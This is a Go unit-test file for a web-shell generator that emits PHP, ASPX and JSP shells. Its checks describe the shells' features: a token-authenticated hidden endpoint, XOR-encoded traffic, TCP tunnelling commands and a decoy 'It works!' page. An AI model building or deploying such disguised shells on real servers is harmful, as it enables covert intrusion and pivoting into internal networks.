package webshell

import (
	"crypto/sha256"
	"encoding/hex"
	"strings"
	"testing"
)

const testKey = "s3cret-test-key"

func testAuthHex() string {
	h := sha256.Sum256([]byte(testKey))
	return hex.EncodeToString(h[:])
}

func testKeyHex() string {
	return hex.EncodeToString([]byte(testKey))
}

func TestGeneratePHP(t *testing.T) {
	out, err := Generate(Config{Format: FormatPHP, Key: testKey})
	if err != nil {
		t.Fatalf("Generate PHP: %v", err)
	}
	if out == "" {
		t.Fatal("Generate PHP: empty output")
	}
	if !strings.HasPrefix(out, "<?php") {
		t.Error("PHP output should start with <?php")
	}
	if !strings.Contains(out, testAuthHex()) {
		t.Error("PHP output missing auth token")
	}
	if !strings.Contains(out, testKeyHex()) {
		t.Error("PHP output missing key hex")
	}
	// Verify protocol commands are present
	for _, cmd := range []string{"connect", "send", "recv", "disconnect", "ping"} {
		if !strings.Contains(out, "'"+cmd+"'") {
			t.Errorf("PHP output missing command: %s", cmd)
		}
	}
	// Verify XOR encryption function exists
	if !strings.Contains(out, "base64_decode") {
		t.Error("PHP output missing base64_decode (XOR decryption)")
	}
	if !strings.Contains(out, "base64_encode") {
		t.Error("PHP output missing base64_encode (XOR encryption)")
	}
	// Verify auth check
	if !strings.Contains(out, "HTTP_X_TOKEN") {
		t.Error("PHP output missing X-Token auth check")
	}
	// Verify cover page
	if !strings.Contains(out, "It works!") {
		t.Error("PHP output missing cover page")
	}
}

func TestGenerateASPX(t *testing.T) {
	out, err := Generate(Config{Format: FormatASPX, Key: testKey})
	if err != nil {
		t.Fatalf("Generate ASPX: %v", err)
	}
	if out == "" {
		t.Fatal("Generate ASPX: empty output")
	}
	if !strings.Contains(out, "<%@ Page Language=\"C#\"") {
		t.Error("ASPX output should contain Page directive")
	}
	if !strings.Contains(out, testAuthHex()) {
		t.Error("ASPX output missing auth token")
	}
	if !strings.Contains(out, testKeyHex()) {
		t.Error("ASPX output missing key hex")
	}
	// Verify protocol commands
	for _, cmd := range []string{"connect", "send", "recv", "disconnect", "ping"} {
		if !strings.Contains(out, "\""+cmd+"\"") {
			t.Errorf("ASPX output missing command: %s", cmd)
		}
	}
	// Verify TcpClient usage
	if !strings.Contains(out, "TcpClient") {
		t.Error("ASPX output missing TcpClient")
	}
	// Verify auth check
	if !strings.Contains(out, "X-Token") {
		t.Error("ASPX output missing X-Token auth check")
	}
	// Verify cover page
	if !strings.Contains(out, "It works!") {
		t.Error("ASPX output missing cover page")
	}
}

func TestGenerateJSP(t *testing.T) {
	out, err := Generate(Config{Format: FormatJSP, Key: testKey})
	if err != nil {
		t.Fatalf("Generate JSP: %v", err)
	}
	if out == "" {
		t.Fatal("Generate JSP: empty output")
	}
	if !strings.Contains(out, "<%@ page import=") {
		t.Error("JSP output should contain page import directive")
	}
	if !strings.Contains(out, testAuthHex()) {
		t.Error("JSP output missing auth token")
	}
	if !strings.Contains(out, testKeyHex()) {
		t.Error("JSP output missing key hex")
	}
	// Verify protocol commands
	for _, cmd := range []string{"connect", "send", "recv", "disconnect", "ping"} {
		if !strings.Contains(out, "\""+cmd+"\"") {
			t.Errorf("JSP output missing command: %s", cmd)
		}
	}
	// Verify Socket usage
	if !strings.Contains(out, "java.net.Socket") || !strings.Contains(out, "new Socket()") {
		// Check for Socket import or usage
		if !strings.Contains(out, "Socket") {
			t.Error("JSP output missing Socket usage")
		}
	}
	// Verify ConcurrentHashMap for session storage
	if !strings.Contains(out, "ConcurrentHashMap") {
		t.Error("JSP output missing ConcurrentHashMap for session storage")
	}
	// Verify auth check
	if !strings.Contains(out, "X-Token") {
		t.Error("JSP output missing X-Token auth check")
	}
	// Verify cover page
	if !strings.Contains(out, "It works!") {
		t.Error("JSP output missing cover page")
	}
}

func TestGenerateInvalidFormat(t *testing.T) {
	_, err := Generate(Config{Format: "invalid", Key: testKey})
	if err == nil {
		t.Fatal("expected error for invalid format")
	}
	if !strings.Contains(err.Error(), "unsupported format") {
		t.Errorf("error should mention unsupported format, got: %v", err)
	}
}

func TestGenerateEmptyKey(t *testing.T) {
	_, err := Generate(Config{Format: FormatPHP, Key: ""})
	if err == nil {
		t.Fatal("expected error for empty key")
	}
	if !strings.Contains(err.Error(), "key is required") {
		t.Errorf("error should mention key required, got: %v", err)
	}
}

func TestGenerateDifferentKeysProduceDifferentOutput(t *testing.T) {
	out1, err := Generate(Config{Format: FormatPHP, Key: "key1"})
	if err != nil {
		t.Fatal(err)
	}
	out2, err := Generate(Config{Format: FormatPHP, Key: "key2"})
	if err != nil {
		t.Fatal(err)
	}
	if out1 == out2 {
		t.Error("different keys should produce different output")
	}
}

func TestGenerateAllFormatsNonEmpty(t *testing.T) {
	for _, f := range ValidFormats() {
		out, err := Generate(Config{Format: f, Key: testKey})
		if err != nil {
			t.Errorf("Generate %s: %v", f, err)
			continue
		}
		if len(out) < 100 {
			t.Errorf("Generate %s: output suspiciously short (%d bytes)", f, len(out))
		}
	}
}

func TestGenerateNoPlaceholdersRemain(t *testing.T) {
	for _, f := range ValidFormats() {
		out, err := Generate(Config{Format: f, Key: testKey})
		if err != nil {
			t.Errorf("Generate %s: %v", f, err)
			continue
		}
		if strings.Contains(out, "__KEY_HEX__") {
			t.Errorf("Generate %s: unreplaced __KEY_HEX__ placeholder", f)
		}
		if strings.Contains(out, "__AUTH_HEX__") {
			t.Errorf("Generate %s: unreplaced __AUTH_HEX__ placeholder", f)
		}
	}
}

func TestValidFormats(t *testing.T) {
	formats := ValidFormats()
	if len(formats) != 3 {
		t.Errorf("expected 3 formats, got %d", len(formats))
	}
	expected := map[Format]bool{FormatPHP: true, FormatASPX: true, FormatJSP: true}
	for _, f := range formats {
		if !expected[f] {
			t.Errorf("unexpected format: %s", f)
		}
	}
}
